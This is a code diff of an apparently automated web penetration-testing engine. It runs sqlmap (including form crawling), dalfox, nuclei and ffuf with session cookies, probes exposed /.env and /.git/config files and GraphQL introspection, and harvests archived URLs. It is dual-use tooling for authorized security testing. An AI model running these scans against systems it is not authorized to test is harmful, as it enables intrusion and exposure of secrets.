-            if self._looks_static_asset(route, allow_js=False):
-                return
-            if not is_url_in_scope(route, base_url, scope_rules):
-                return
-            if route in seen_routes:
-                return
-            seen_routes.add(route)
-            route_entries.append((route, len(route_entries)))
-
-        for route in self._urls_from_declared_paths(base_url, declared_paths or []):
-            add_route(route)
-        for route in urls or []:
-            add_route(route)
-        add_route(base_url)
-
-        def route_rank(item: tuple[str, int]) -> tuple[int, int]:
-            route, order = item
-            path = (urlparse(route).path or "/").lower()
-            score = order
-            hints = self._declared_hints_for_route(path, declared_paths)
-            if hints:
-                score -= 500
-            priority_markers = (
-                ("/catalog/product/stock", -220),
-                ("/catalog/product", -190),
-                ("/catalog/subscribe", -180),
-                ("/catalog", -170),
-                ("/blog/post", -150),
-                ("/blog", -140),
-                ("/login", -130),
-                ("/my-account", -120),
-            )
-            for marker, weight in priority_markers:
-                if marker in path:
-                    score += weight
-            if path in ("", "/"):
-                score += 250
-            return (score, order)
-
-        route_param_sets: list[tuple[str, list[str]]] = []
-        for route, _ in sorted(route_entries, key=route_rank)[:max_routes]:
-            path = (urlparse(route).path or "/").lower()
-            hints = self._declared_hints_for_route(path, declared_paths)
-            names = self._route_parameter_names(route, urls or [], declared_paths)
-            if not names:
-                continue
-            per_route_limit = 34 if hints else 20
-            if path in ("", "/"):
-                per_route_limit = 8
-            route_param_sets.append((route, names[:per_route_limit]))
-
-        generated: list[str] = []
-        seen_urls = set()
-        max_param_depth = max((len(names) for _, names in route_param_sets), default=0)
-        for idx in range(max_param_depth):
-            for route, names in route_param_sets:
-                if idx >= len(names):
-                    continue
-                name = names[idx]
-                candidate = self._append_param_to_url(route, name)
-                if candidate in seen_urls or not is_url_in_scope(candidate, base_url, scope_rules):
-                    continue
-                seen_urls.add(candidate)
-                generated.append(candidate)
-                if len(generated) >= max_urls:
-                    return generated
-        return generated
-
-    def _route_without_query(self, url: str) -> str:
-        parsed = urlparse(url)
-        if parsed.scheme and parsed.netloc and not parsed.path:
-            parsed = parsed._replace(path="/")
-        return urlunparse(parsed._replace(query="", fragment=""))
-
-    async def hidden_parameter_bruteforce(
-        self,
-        base_url: str,
-        urls: list,
-        scope_rules: dict | None = None,
-        declared_paths: list | None = None,
-        max_routes: int = 20,
-    ) -> list:
-        routes = []
-        for raw in [base_url] + (urls or []):
-            route = self._route_without_query(raw)
-            if self._looks_static_asset(route, allow_js=False):
-                continue
-            if route not in routes and is_url_in_scope(route, base_url, scope_rules):
-                routes.append(route)
-            if len(routes) >= max_routes:
-                break
-        if not routes:
-            return []
-
-        names = self._candidate_parameter_names(urls, declared_paths)
-        marker = "yggdrasil_param_probe"
-        discovered = []
-        seen = set()
-        await self.log(f"wfuzz-style hidden parameter brute force on {len(routes)} route(s) with {len(names)} names", "info")
-
-        async with httpx.AsyncClient(timeout=7, verify=False, follow_redirects=True) as c:
-            for route in routes:
-                try:
-                    control = await c.get(route, params={"yggdrasil_control": marker})
-                except Exception:
-                    continue
-                control_text = control.text[:12000]
-                control_len = len(control.content)
-                for name in names:
-                    probe_url = route + ("&" if "?" in route else "?") + urlencode({name: marker})
-                    if not is_url_in_scope(probe_url, base_url, scope_rules):
-                        continue
+            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
+                                         headers=self._auth_headers()) as c:
+                for sp in SPEC_PATHS:
                     try:
-                        probe = await c.get(probe_url)
+                        r = await c.get(base + sp)
                     except Exception:
                         continue
-                    delta = abs(len(probe.content) - control_len)
-                    status_changed = probe.status_code != control.status_code
-                    reflected = marker in probe.text
-                    body_changed = delta > 80 and probe.text[:12000] != control_text
-                    if not (status_changed or reflected or body_changed):
+                    if r.status_code != 200:
                         continue
-                    key = (route, name)
-                    if key in seen:
+                    try:
+                        spec = r.json()
+                    except Exception:
                         continue
-                    seen.add(key)
-                    discovered.append({
-                        "url": probe_url,
-                        "route": route,
-                        "parameter": name,
-                        "signal": "reflected" if reflected else "status/length delta",
-                    })
-                    if len(discovered) >= 120:
-                        break
-                if len(discovered) >= 120:
-                    break
-
-        await self.log(
-            f"Hidden parameter brute force discovered {len(discovered)} candidate parameter(s)",
-            "success" if discovered else "info",
-        )
-        return discovered
-
-    async def test_sqli(self, urls: list) -> list:
-        param_urls = [u for u in urls if "?" in u and "=" in u][:25]
-        if not param_urls:
-            await self.log("No parameterized URLs to test for SQLi", "info")
-            return []
-
-        await self.log(f"Testing {len(param_urls)} endpoints for SQL injection (sqlmap)", "info")
-        findings = []
-
-        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
-            f.write("\n".join(param_urls))
-            url_file = f.name
-
-        try:
-            stdout, stderr, rc = await self.run_command(
-                ["sqlmap", "-m", url_file, "--batch", "--random-agent",
-                 "--level", "2", "--risk", "2", "--smart",
-                 "--technique", "BEUST", "--threads", "4",
-                 "--timeout", "15", "--retries", "1",
-                 "--output-dir", "/tmp/sqlmap_out"],
-                timeout=600,
-            )
-            if rc == 127:
-                await self.log("sqlmap not available; SQLi testing skipped", "warn")
-                return []
-
-            combined = stdout + stderr
-            # sqlmap prints "Parameter: X (GET)" and "Type:" blocks on a hit
-            vuln_blocks = re.findall(
-                r"Parameter:\s*(.+?)\s*\((\w+)\).*?Type:\s*(.+?)\n.*?Title:\s*(.+?)\n",
-                combined, re.DOTALL,
-            )
-            hit_urls = re.findall(r"sqlmap identified the following injection point.*?URL:\s*(\S+)", combined, re.DOTALL)
-
-            for param, method, sqli_type, title in vuln_blocks:
-                findings.append({"parameter": param.strip(), "method": method, "type": sqli_type.strip()})
-                await self.add_finding(
-                    title=f"SQL Injection: {param.strip()} parameter ({method})",
-                    severity="critical",
-                    description=f"SQL injection confirmed by sqlmap on parameter '{param.strip()}'. "
-                                f"Injection type: {sqli_type.strip()}. An attacker can read or modify "
-                                f"the database, extract credentials, and potentially achieve RCE.",
-                    evidence=f"sqlmap: {title.strip()}\nParameter: {param.strip()} ({method})",
-                    cvss_score=9.8,
-                    remediation="Use parameterized queries / prepared statements. Never concatenate "
-                                "user input into SQL. Apply least-privilege DB accounts and a WAF.",
-                )
-
-            if not vuln_blocks and "is vulnerable" in combined.lower():
-                await self.add_finding(
-                    title="Possible SQL Injection (manual confirm)",
-                    severity="high",
-                    description="sqlmap flagged a potential injection point. Manual confirmation advised.",
-                    evidence=combined[-400:],
-                    cvss_score=7.5,
-                    remediation="Parameterize queries; review flagged endpoint.",
-                )
-
-            await self.log(f"SQLi testing complete: {len(vuln_blocks)} confirmed injection points", "success" if vuln_blocks else "info")
+                    eps = endpoints_from_openapi(spec, base_url)
+                    if eps:
+                        await self.log(f"Imported {len(eps)} endpoints from API spec {sp}", "success")
+                        return eps[:500]
         except Exception as e:
-            await self.log(f"sqlmap error: {e}", "warn")
-        finally:
-            os.unlink(url_file)
+            await self.log(f"API spec import skipped: {e}", "warn")
+        return []
 
-        return findings
+    # ── Passive parameter discovery (ParamSpider / gau style) ────
+    async def gather_archive_urls(self, base_url: str, cap: int = 2500) -> list:
+        """Harvest historical URLs and hidden parameters from web archives.
 
-    async def _basic_xss_reflection(self, param_urls: list) -> list:
-        """Fast fallback when dalfox is unavailable or times out.
+        Queries the Wayback Machine CDX API for every URL ever archived for the
+        host and keeps the parameterized ones. These are endpoints/params that
+        are no longer linked on the live site, so an active crawler never finds
+        them. No traffic hits the target (fully passive)."""
+        import httpx
 
-        This does not prove script execution. It records reflected parameters as
-        low-severity candidates so a tester knows where browser validation is worth doing.
-        """
+        host = urlparse(base_url).netloc.split(":")[0]
+        if not host:
+            return []
+        await self.log(f"Archive parameter discovery for {host} (Wayback CDX)", "info")
+
+        found = set()
+        cdx = ("http://web.archive.org/cdx/search/cdx"
+               f"?url={host}/*&output=text&fl=original&collapse=urlkey&limit=15000")
+        try:
+            async with httpx.AsyncClient(timeout=45, follow_redirects=True) as c:
+                r = await c.get(cdx, headers={"User-Agent": "YGGDRASIL-recon/1.0"})
+                if r.status_code == 200:
+                    for line in r.text.splitlines():
+                        u = line.strip()
+                        if not u.startswith("http"):
+                            continue
+                        path = u.lower().split("?", 1)[0]
+                        if path.endswith(ARCHIVE_SKIP_EXT):
+                            continue
+                        found.add(u)
+        except Exception as e:
+            await self.log(f"Archive discovery failed ({e}); continuing without it", "warn")
+            return []
+
+        urls = list(found)
+        param_urls = [u for u in urls if "?" in u and "=" in u]
+        await self.log(
+            f"Archive discovery: {len(urls)} archived URLs, {len(param_urls)} with parameters",
+            "success" if param_urls else "info",
+        )
+        # Parameterized URLs first (highest test value), then the rest, capped.
+        ordered = param_urls + [u for u in urls if not ("?" in u and "=" in u)]
+        return ordered[:cap]
+
+    def _dedupe_by_params(self, urls: list) -> list:
+        """Collapse URLs that hit the same endpoint with the same parameter names
+        (e.g. id=1 and id=2 -> one), so each param set is tested once. This is
+        what makes archive discovery usable instead of thousands of near-dupes."""
+        seen, out = set(), []
+        for u in urls:
+            p = urlparse(u)
+            if "?" in u and "=" in u:
+                names = tuple(sorted(parse_qs(p.query, keep_blank_values=True).keys()))
+                key = (p.netloc, p.path, names)
+            else:
+                key = (p.netloc, p.path, ())
+            if key in seen:
+                continue
+            seen.add(key)
+            out.append(u)
+        return out
+
+    # ── SQL injection ────────────────────────────────────────────
+    async def _emit_sqlmap_hits(self, combined: str, tag: str = "") -> list:
+        """Parse sqlmap output for confirmed injection points and raise a finding
+        for each. Shared by the GET-parameter and form passes."""
+        found = []
+        vuln_blocks = re.findall(
+            r"Parameter:\s*(.+?)\s*\((\w+)\).*?Type:\s*(.+?)\n.*?Title:\s*(.+?)\n",
+            combined, re.DOTALL,
+        )
+        for param, method, sqli_type, title in vuln_blocks:
+            found.append({"parameter": param.strip(), "method": method, "type": sqli_type.strip()})
+            await self.add_finding(
+                title=f"SQL Injection: {param.strip()} ({method}){tag}",
+                severity="critical",
+                description=f"SQL injection confirmed by sqlmap on parameter '{param.strip()}'. "
+                            f"Injection type: {sqli_type.strip()}. An attacker can read or modify "
+                            f"the database, extract credentials, and potentially achieve RCE.",
+                evidence=f"sqlmap: {title.strip()}\nParameter: {param.strip()} ({method})",
+                cvss_score=9.8,
+                remediation="Use parameterized queries / prepared statements. Never concatenate "
+                            "user input into SQL. Apply least-privilege DB accounts and a WAF.",
+            )
+        return found
+
+    async def test_sqli(self, base_url: str, urls: list) -> list:
         findings = []
-        seen = set()
-        marker_base = "yggdrasil_xss_probe"
-        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as c:
-            for url in param_urls[:25]:
-                parsed = urlparse(url)
-                pairs = parse_qsl(parsed.query, keep_blank_values=True)
-                for name, _ in pairs[:5]:
-                    key = (parsed.path, name)
-                    if key in seen:
-                        continue
-                    marker = f"{marker_base}_{re.sub(r'[^a-zA-Z0-9]', '_', name)[:20]}"
-                    probe_pairs = [(k, marker if k == name else v) for k, v in pairs]
-                    probe_url = urlunparse(parsed._replace(query=urlencode(probe_pairs, doseq=True)))
-                    try:
-                        response = await c.get(probe_url)
-                    except Exception:
-                        continue
-                    if marker not in response.text:
-                        continue
-                    seen.add(key)
-                    findings.append({"param": name, "type": "reflection", "url": probe_url})
+        param_urls = [u for u in urls if "?" in u and "=" in u][:25]
+
+        # (1) GET-parameter SQLi
+        if param_urls:
+            await self.log(f"Testing {len(param_urls)} endpoints for SQL injection (sqlmap)", "info")
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+                f.write("\n".join(param_urls))
+                url_file = f.name
+            try:
+                sqlmap_cmd = ["sqlmap", "-m", url_file, "--batch", "--random-agent",
+                              "--level", "2", "--risk", "2", "--smart",
+                              "--technique", "BEUST", "--threads", "4",
+                              "--timeout", "15", "--retries", "1",
+                              "--output-dir", "/tmp/sqlmap_out"]
+                if self._cookie():
+                    sqlmap_cmd += ["--cookie", self._cookie()]
+                stdout, stderr, rc = await self.run_command(sqlmap_cmd, timeout=600)
+                if rc == 127:
+                    await self.log("sqlmap not available; SQLi testing skipped", "warn")
+                    return findings
+                combined = stdout + stderr
+                findings += await self._emit_sqlmap_hits(combined)
+                if not findings and "is vulnerable" in combined.lower():
                     await self.add_finding(
-                        title=f"Reflected Parameter Candidate: {name}",
-                        severity="low",
-                        description=(
-                            "The parameter value was reflected in the HTTP response. This is not confirmed XSS, "
-                            "but it is a useful candidate for context-aware browser validation."
-                        ),
-                        evidence=f"Probe marker reflected in response\nURL: {probe_url}",
-                        cvss_score=3.7,
-                        remediation=(
-                            "Apply context-aware output encoding and validate whether the reflection occurs in "
-                            "HTML, attribute, script, URL, or JSON context."
-                        ),
+                        title="Possible SQL Injection (manual confirm)",
+                        severity="high",
+                        description="sqlmap flagged a potential injection point. Manual confirmation advised.",
+                        evidence=combined[-400:],
+                        cvss_score=7.5,
+                        remediation="Parameterize queries; review flagged endpoint.",
                     )
-        await self.log(f"Basic reflection fallback complete: {len(findings)} candidate(s)", "success" if findings else "info")
+            except Exception as e:
+                await self.log(f"sqlmap error: {e}", "warn")
+            finally:
+                os.unlink(url_file)
+        else:
+            await self.log("No parameterized URLs to test for SQLi — trying forms", "info")
+
+        # (2) Form-based SQLi: sqlmap discovers and tests the POST/GET forms it finds
+        # (login, search, checkout). This is where auth-bypass SQLi actually lives.
+        if base_url:
+            await self.log("Testing forms for SQL injection (sqlmap --forms)", "info")
+            try:
+                forms_cmd = ["sqlmap", "-u", base_url, "--forms", "--crawl=1", "--batch",
+                             "--random-agent", "--level", "2", "--risk", "2", "--smart",
+                             "--technique", "BEUST", "--threads", "4", "--timeout", "15",
+                             "--retries", "1", "--crawl-exclude", "logout|logoff|signout",
+                             "--output-dir", "/tmp/sqlmap_out"]
+                if self._cookie():
+                    forms_cmd += ["--cookie", self._cookie()]
+                fstdout, fstderr, frc = await self.run_command(forms_cmd, timeout=600)
+                if frc != 127:
+                    findings += await self._emit_sqlmap_hits(fstdout + fstderr, " [form]")
+            except Exception as e:
+                await self.log(f"sqlmap forms error: {e}", "warn")
+
+        await self.log(f"SQLi testing complete: {len(findings)} injection point(s)",
+                       "success" if findings else "info")
         return findings
 
-    # XSS
+    # ── XSS ──────────────────────────────────────────────────────
     async def test_xss(self, urls: list) -> list:
         param_urls = [u for u in urls if "?" in u and "=" in u][:40]
         if not param_urls:
@@ -973,11 +408,11 @@ class OffensiveEngine:
             url_file = f.name
 
         try:
-            stdout, stderr, rc = await self.run_command(
-                ["dalfox", "file", url_file, "--format", "json",
-                 "--silence", "--no-spinner", "--worker", "10", "--timeout", "10"],
-                timeout=420,
-            )
+            dalfox_cmd = ["dalfox", "file", url_file, "--format", "json",
+                          "--silence", "--no-spinner", "--worker", "10", "--timeout", "10"]
+            if self._cookie():
+                dalfox_cmd += ["-C", self._cookie()]
+            stdout, stderr, rc = await self.run_command(dalfox_cmd, timeout=420)
             if rc == 127:
                 await self.log("dalfox not available; XSS testing skipped", "warn")
                 return []
@@ -1009,10 +444,7 @@ class OffensiveEngine:
                 except json.JSONDecodeError:
                     continue
 
-            if not findings:
-                await self.log("Dalfox did not return confirmed XSS; running basic reflection fallback", "info")
-                findings.extend(await self._basic_xss_reflection(param_urls))
-            await self.log(f"XSS testing complete: {len(findings)} confirmed/candidate", "success" if findings else "info")
+            await self.log(f"XSS testing complete: {len(findings)} confirmed", "success" if findings else "info")
         except Exception as e:
             await self.log(f"dalfox error: {e}", "warn")
         finally:
@@ -1033,11 +465,11 @@ class OffensiveEngine:
             uf = f.name
 
         try:
-            stdout, _, rc = await self.run_command(
-                ["nuclei", "-l", uf, "-dast", "-jsonl", "-silent",
-                 "-severity", "critical,high,medium", "-timeout", "10", "-rl", "50"],
-                timeout=420,
-            )
+            nuclei_cmd = ["nuclei", "-l", uf, "-dast", "-jsonl", "-silent",
+                          "-severity", "critical,high,medium", "-timeout", "10", "-rl", "50"]
+            if self._cookie():
+                nuclei_cmd += ["-H", f"Cookie: {self._cookie()}"]
+            stdout, _, rc = await self.run_command(nuclei_cmd, timeout=420)
             if rc == 127:
                 await self.log("nuclei not available for DAST", "warn")
                 return []
@@ -1072,206 +504,6 @@ class OffensiveEngine:
             os.unlink(uf)
 
         return findings
-    # Path traversal / local file include
-    async def test_path_traversal(
-        self,
-        urls: list,
-        base_url: str,
-        scope_rules: dict | None = None,
-        lab_mode: bool = False,
-    ) -> list:
-        parameterized = [
-            u for u in urls
-            if "?" in u and "=" in u and is_url_in_scope(u, base_url, scope_rules)
-        ][:40]
-        path_like_candidates = [
-            u for u in parameterized
-            if build_traversal_probes(u, lab_mode=lab_mode, max_probes=1)
-        ]
-        if not path_like_candidates:
-            await self.log(
-                f"No path-like parameters to test for traversal ({len(parameterized)} parameterized URLs reviewed)",
-                "info",
-            )
-            return []
-
-        candidates = path_like_candidates
-        await self.log(
-            f"Testing {len(candidates)} path-like URLs for path traversal/LFI "
-            f"({'lab payloads enabled' if lab_mode else 'safe canary mode'})",
-            "info",
-        )
-        findings = []
-        seen = set()
-
-        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False) as c:
-            for url in candidates:
-                probes = build_traversal_probes(url, lab_mode=lab_mode, max_probes=10)
-                if not probes:
-                    continue
-                try:
-                    baseline = await c.get(url)
-                except Exception:
-                    continue
-                for probe in probes:
-                    if not is_url_in_scope(probe.url, base_url, scope_rules):
-                        continue
-                    key = (probe.parameter, urlparse(probe.url).path)
-                    if key in seen:
-                        continue
-                    try:
-                        response = await c.get(probe.url)
-                    except Exception:
-                        continue
-                    hit = analyze_traversal_pair(baseline, response, probe.payload, lab_mode=lab_mode)
-                    if not hit:
-                        continue
-                    seen.add(key)
-                    findings.append({
-                        "url": probe.url,
-                        "parameter": probe.parameter,
-                        "severity": hit["severity"],
-                        "confidence": hit["confidence"],
-                        "reason": hit["reason"],
-                    })
-                    await self.add_finding(
-                        title=f"Possible Path Traversal/LFI: {probe.parameter}",
-                        severity=hit["severity"],
-                        description=(
-                            "Yggdrasil observed response behavior consistent with path traversal "
-                            "or unsafe server-side file access. Validate impact manually before "
-                            "marking confirmed outside lab targets."
-                        ),
-                        evidence=(
-                            f"URL: {probe.url}\n"
-                            f"Parameter: {probe.parameter}\n"
-                            f"Payload family: {probe.family}\n"
-                            f"Signal: {hit['reason']}\n"
-                            f"Confidence: {hit['confidence']}\n"
-                            "Mappings: CWE-22, OWASP Top 10 2025, OWASP WSTG path traversal testing"
-                        ),
-                        cvss_score=7.5 if hit["severity"] == "high" else 5.3,
-                        remediation=(
-                            "Resolve requested files against an allowlisted base directory, "
-                            "canonicalize before authorization, reject traversal sequences, and "
-                            "avoid passing user-controlled paths into filesystem APIs."
-                        ),
-                    )
-                    break
-
-        await self.log(f"Path traversal testing complete: {len(findings)} candidate findings", "success" if findings else "info")
-        return findings
-
-    # IDOR / BOLA
-    async def test_idor_bola(
-        self,
-        urls: list,
-        base_url: str,
-        scope_rules: dict | None = None,
-        auth_profiles: dict | None = None,
-    ) -> list:
-        candidates = [
-            u for u in urls
-            if is_url_in_scope(u, base_url, scope_rules) and build_idor_probes(u, max_probes=1)
-        ][:50]
-        if not candidates:
-            await self.log("No object-reference URLs to test for IDOR/BOLA", "info")
-            return []
-
-        profiles = {
-            name: headers for name, headers in (auth_profiles or {}).items()
-            if isinstance(name, str) and isinstance(headers, dict)
-        }
-        cross_role = len(profiles) >= 2
-        mode = "cross-role replay" if cross_role else "unauthenticated neighbor-ID heuristic"
-        await self.log(f"Testing {len(candidates)} IDOR/BOLA candidates ({mode})", "info")
-
-        findings = []
-        seen = set()
-
-        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False) as c:
-            if cross_role:
-                names = list(profiles.keys())
-                owner = names[0]
-                for url in candidates[:25]:
-                    try:
-                        baseline = await c.get(url, headers=profiles[owner])
-                    except Exception:
-                        continue
-                    for other in names[1:]:
-                        try:
-                            replay = await c.get(url, headers=profiles[other])
-                        except Exception:
-                            continue
-                        hit = analyze_idor_pair(baseline, replay, cross_role=True)
-                        if not hit:
-                            continue
-                        key = (url, other)
-                        if key in seen:
-                            continue
-                        seen.add(key)
-                        findings.append({"url": url, "profile": other, **hit})
-                        await self.add_finding(
-                            title=f"Probable IDOR/BOLA: {urlparse(url).path}",
-                            severity=hit["severity"],
-                            description=(
-                                "An alternate auth profile received a near-identical object response. "
-                                "This suggests missing per-object authorization or tenant isolation."
-                            ),
-                            evidence=(
-                                f"URL: {url}\nOwner profile: {owner}\nReplay profile: {other}\n"
-                                f"Signal: {hit['reason']}\nSimilarity: {hit['similarity']:.2f}\n"
-                                "Mappings: CWE-639, CWE-862, CWE-863, OWASP Broken Access Control, OWASP API1 BOLA"
-                            ),
-                            cvss_score=7.5,
-                            remediation="Enforce server-side object ownership checks for every object read/write.",
-                        )
-                        break
-            else:
-                for url in candidates:
-                    probes = build_idor_probes(url, max_probes=4)
-                    if not probes:
-                        continue
-                    try:
-                        baseline = await c.get(url)
-                    except Exception:
-                        continue
-                    for probe in probes:
-                        if not is_url_in_scope(probe.url, base_url, scope_rules):
-                            continue
-                        try:
-                            replay = await c.get(probe.url)
-                        except Exception:
-                            continue
-                        hit = analyze_idor_pair(baseline, replay, cross_role=False)
-                        if not hit:
-                            continue
-                        key = (probe.url, probe.parameter)
-                        if key in seen:
-                            continue
-                        seen.add(key)
-                        findings.append({"url": probe.url, "parameter": probe.parameter, **hit})
-                        await self.add_finding(
-                            title=f"Potential IDOR/BOLA Candidate: {probe.parameter}",
-                            severity=hit["severity"],
-                            description=(
-                                "A neighboring object identifier returned sensitive-looking object data. "
-                                "This is a candidate access-control issue; confirm with two authorized "
-                                "accounts for a true IDOR/BOLA result."
-                            ),
-                            evidence=(
-                                f"Baseline URL: {url}\nProbe URL: {probe.url}\n"
-                                f"Parameter: {probe.parameter}\nOriginal: {probe.original_value}\n"
-                                f"Candidate: {probe.payload}\nSignal: {hit['reason']}\n"
-                                "Mappings: CWE-639, CWE-862, CWE-863, OWASP Broken Access Control, OWASP API1 BOLA"
-                            ),
-                            cvss_score=3.7 if hit["severity"] == "low" else 5.3,
-                            remediation="Enforce object-level authorization and tenant checks before returning records.",
-                        )
-                        break
-
-        await self.log(f"IDOR/BOLA testing complete: {len(findings)} candidate findings", "success" if findings else "info")
-        return findings
 
     # ── Auth / JWT / IDOR probes ─────────────────────────────────
     async def test_auth(self, base_url: str, urls: list) -> list:
@@ -1286,7 +518,7 @@ class OffensiveEngine:
             if re.search(r"/(api|rest)/\w+/\d+", u):
                 api_id_urls.append(u)
 
-        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as c:
+        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True, headers=self._auth_headers()) as c:
             for u in api_id_urls[:15]:
                 m = re.search(r"(.*/)(\d+)(\b.*)$", u)
                 if not m:
@@ -1298,7 +530,7 @@ class OffensiveEngine:
                         r = await c.get(probe)
                         if r.status_code == 200 and len(r.content) > 30:
                             findings.append({"type": "idor", "url": probe})
-                            await self.add_finding(
+                            _f = await self.add_finding(
                                 title=f"Potential IDOR: {probe}",
                                 severity="high",
                                 description="An object referenced by a sequential ID was accessible without "
@@ -1309,6 +541,8 @@ class OffensiveEngine:
                                 remediation="Enforce per-object ownership checks server-side on every request. "
                                             "Do not rely on unguessable IDs; use authorization, not obscurity.",
                             )
+                            await self.capture(r, finding_id=(_f.id if _f else None),
+                                               notes="Sequential object id accessible")
                             break
                     except Exception:
                         continue
@@ -1317,7 +551,7 @@ class OffensiveEngine:
         sensitive = ["/.git/config", "/.env", "/actuator/health", "/actuator/env",
                      "/api/swagger.json", "/swagger-ui/", "/graphql", "/server-status",
                      "/.well-known/security.txt", "/debug", "/metrics"]
-        async with httpx.AsyncClient(timeout=6, verify=False, follow_redirects=False) as c:
+        async with httpx.AsyncClient(timeout=6, verify=False, follow_redirects=False, headers=self._auth_headers()) as c:
             for path in sensitive:
                 try:
                     r = await c.get(base_url.rstrip("/") + path)
@@ -1325,7 +559,7 @@ class OffensiveEngine:
                         sev = "high" if path in ("/.env", "/.git/config", "/actuator/env") else "medium"
                         cvss = 7.5 if sev == "high" else 5.3
                         findings.append({"type": "exposure", "path": path})
-                        await self.add_finding(
+                        _f = await self.add_finding(
                             title=f"Sensitive Endpoint Exposed: {path}",
                             severity=sev,
                             description=f"{path} is publicly accessible and returned content. "
@@ -1335,17 +569,19 @@ class OffensiveEngine:
                             remediation="Restrict or remove the endpoint. Move secrets to env/secret managers "
                                         "and block metadata/debug routes at the edge.",
                         )
+                        await self.capture(r, finding_id=(_f.id if _f else None),
+                                           notes=f"Sensitive endpoint {path} publicly accessible")
                 except Exception:
                     continue
 
         # GraphQL introspection (common high-value finding)
         try:
-            async with httpx.AsyncClient(timeout=8, verify=False) as c:
+            async with httpx.AsyncClient(timeout=8, verify=False, headers=self._auth_headers()) as c:
                 q = {"query": "{__schema{types{name}}}"}
                 r = await c.post(base_url.rstrip("/") + "/graphql", json=q)
                 if r.status_code == 200 and "__schema" in r.text:
                     findings.append({"type": "graphql_introspection"})
-                    await self.add_finding(
+                    _f = await self.add_finding(
                         title="GraphQL Introspection Enabled",
                         severity="medium",
                         description="The GraphQL endpoint exposes its full schema via introspection, "
@@ -1354,6 +590,8 @@ class OffensiveEngine:
                         cvss_score=5.3,
                         remediation="Disable introspection in production and enforce query depth/complexity limits.",
                     )
+                    await self.capture(r, finding_id=(_f.id if _f else None),
+                                       notes="GraphQL introspection returned __schema")
         except Exception:
             pass
 
@@ -1361,474 +599,810 @@ class OffensiveEngine:
         return findings
 
     # ── Content discovery with a real wordlist ───────────────────
-    def _parse_ffuf_json(self, stdout: str) -> list:
-        found = []
-        text = stdout.strip()
-        if not text:
-            return found
-        try:
-            data = json.loads(text)
-            if isinstance(data, dict) and isinstance(data.get("results"), list):
-                for hit in data["results"]:
-                    found.append({"url": hit.get("url", ""), "status": hit.get("status", 0)})
-                return found
-        except json.JSONDecodeError:
-            pass
-        for line in stdout.splitlines():
-            try:
-                hit = json.loads(line)
-                found.append({"url": hit.get("url", ""), "status": hit.get("status", 0)})
-            except json.JSONDecodeError:
-                continue
-        return found
+    async def content_discovery(self, base_url: str, extra_wordlists: list = None) -> list:
+        # Priority: generated/selected lists passed in, then first existing curated list.
+        lists = list(extra_wordlists or [])
+        curated = next((w for w in SECLISTS_DIRS if os.path.exists(w)), None)
+        if curated and curated not in lists:
+            lists.append(curated)
+        lists = [w for w in lists if w and os.path.exists(w)]
+        if not lists:
+            await self.log("No wordlists present; skipping deep content discovery", "warn")
+            return []
 
-    async def _python_content_discovery(self, base_url: str, words: list) -> list:
-        found = []
-        async with httpx.AsyncClient(timeout=6, verify=False, follow_redirects=False) as c:
-            for i in range(0, min(len(words), 350), 25):
-                batch = words[i:i + 25]
-                tasks = [c.get(normalize_discovered_url(base_url, word)) for word in batch]
-                results = await asyncio.gather(*tasks, return_exceptions=True)
-                for result in results:
-                    if isinstance(result, Exception):
-                        continue
-                    if result.status_code in (200, 204, 301, 302, 307, 401, 403):
-                        found.append({
-                            "url": str(result.url),
-                            "status": result.status_code,
-                            "length": len(result.content),
-                        })
-        return found
-
-    async def content_discovery(self, base_url: str, urls: list | None = None) -> list:
-        generated_words = generate_discovery_words(base_url, urls or [])
-        wordlist = next((w for w in SECLISTS_DIRS if os.path.exists(w)), None)
-        temp_wordlist = None
-        if not wordlist:
-            await self.log("SecLists not present; using Yggdrasil generated discovery wordlist", "warn")
-            tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
-            tmp.write("\n".join(generated_words))
-            tmp.close()
-            temp_wordlist = tmp.name
-            wordlist = temp_wordlist
-        else:
-            await self.log("Content discovery with SecLists + Yggdrasil high-value checks", "info")
-
-        found = []
-        try:
-            stdout, _, rc = await self.run_command(
-                ["ffuf", "-u", f"{base_url.rstrip('/')}/FUZZ", "-w", wordlist,
-                 "-mc", "200,204,301,302,307,401,403", "-json", "-s",
-                 "-t", "25", "-timeout", "6", "-maxtime", "90"],
-                timeout=120,
-            )
+        await self.log(f"Content discovery with {len(lists)} wordlist(s) (ffuf)", "info")
+        found = {}
+        for wordlist in lists:
+            ffuf_cmd = ["ffuf", "-u", f"{base_url.rstrip('/')}/FUZZ", "-w", wordlist,
+                        "-mc", "200,204,301,302,307,401,403", "-json", "-s",
+                        "-t", "40", "-timeout", "8"]
+            if self._cookie():
+                ffuf_cmd += ["-H", f"Cookie: {self._cookie()}"]
+            stdout, _, rc = await self.run_command(ffuf_cmd, timeout=300)
             if rc == 127:
-                await self.log("ffuf not available; using Python content discovery fallback", "warn")
-                found = await self._python_content_discovery(base_url, generated_words)
-            elif rc == -1:
-                await self.log("ffuf timed out; using generated Python fallback", "warn")
-                found = await self._python_content_discovery(base_url, generated_words)
-            else:
-                found = self._parse_ffuf_json(stdout)
-        finally:
-            if temp_wordlist and os.path.exists(temp_wordlist):
-                os.unlink(temp_wordlist)
-
-        for path, (title, severity, remediation) in HIGH_VALUE_EXPOSURE_PATHS.items():
-            match = next((h for h in found if urlparse(h.get("url", "")).path.rstrip("/") == path.rstrip("/")), None)
-            if not match:
-                continue
-            await self.add_finding(
-                title=title,
-                severity=severity,
-                description=f"Content discovery found high-value path {path}.",
-                evidence=(
-                    f"GET {match.get('url')} -> HTTP {match.get('status')}\n"
-                    "Mappings: OWASP Security Misconfiguration, CWE-200 where sensitive data is exposed"
-                ),
-                cvss_score=7.5 if severity == "high" else 5.3,
-                remediation=remediation,
-            )
-
-        for hit in found[:25]:
-            await self.log(
-                f"Content path discovered: HTTP {hit.get('status', '?')} {hit.get('url', '')}",
-                "info",
-            )
-        if len(found) > 25:
-            await self.log(f"Content discovery found {len(found) - 25} additional paths not shown in log", "info")
-        await self.log(f"Content discovery: {len(found)} paths", "success" if found else "info")
-        return found
-
